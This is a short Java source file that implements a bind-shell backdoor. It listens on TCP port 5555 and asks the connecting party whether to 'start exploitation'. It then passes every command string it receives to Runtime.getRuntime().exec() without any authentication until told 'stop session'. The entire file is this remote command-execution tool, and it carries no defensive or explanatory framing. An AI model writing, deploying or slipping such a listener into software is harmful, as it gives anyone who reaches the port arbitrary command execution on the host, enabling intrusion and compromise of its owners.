package server;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

public class Server {
    private static ServerSocket server;
    private static Socket client;
    private static DataInputStream input;
    private static DataOutputStream output;

    private static void startExploitation() throws IOException {
        while(true) {
            output.writeUTF("user>>>");
            output.flush();

            String command = input.readUTF();
            if (command.equalsIgnoreCase("stop session"))
                return;
            Runtime.getRuntime().exec(command);
        }
    }

    public static void main(String[] args) {
        try {
            server = new ServerSocket(5555);
            client = server.accept();

            output = new DataOutputStream(client.getOutputStream());

            input = new DataInputStream(client.getInputStream());

            output.writeUTF("Connected to " + server.getInetAddress());
            output.writeUTF("Do you wanna start exploitation? [y/n]");
            output.flush();
            Thread.sleep(1000);

            String operation = input.readUTF();
            if (operation.equalsIgnoreCase("y") || operation.equalsIgnoreCase("yes")) {
                output.writeUTF("Starting");
                startExploitation();
                System.exit(0);
            } else {
                output.writeUTF("Invalid command");
                output.writeUTF("Quiting");
                client.close();
                server.close();
                System.exit(0);
            }
        } catch (InterruptedException ie) {
            //TODO
        } catch (IOException ioe) {
            //TODO
        }
    }
}
